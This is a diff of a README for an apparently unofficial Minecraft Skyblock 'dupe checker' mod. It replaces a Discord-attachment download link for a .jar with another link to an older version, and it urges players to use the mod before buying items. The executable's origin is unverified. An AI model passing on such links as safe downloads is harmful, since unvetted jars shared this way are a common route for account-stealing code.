@@ -10,7 +10,7 @@ This mod adds High-Value Dupe checker into your skyblock expirience.
 
 A side mod of Skytils/Sbe, A amazing Dupe Checker.
 
-This side mod can be downloaded [HERE](https://cdn.discordapp.com/attachments/937147258217054229/959873315693002752/NBTitemData-2.7.2.jar)
+This side mod can be downloaded [HERE](https://cdn.discordapp.com/attachments/962856435144876103/963194426748969030/NBTitemData-2.6.3.jar)
 
 ### Why is this useful?
 Many players have been wiped before, Now this will prevent it. Don't buy anything before Dupe-Checking it!
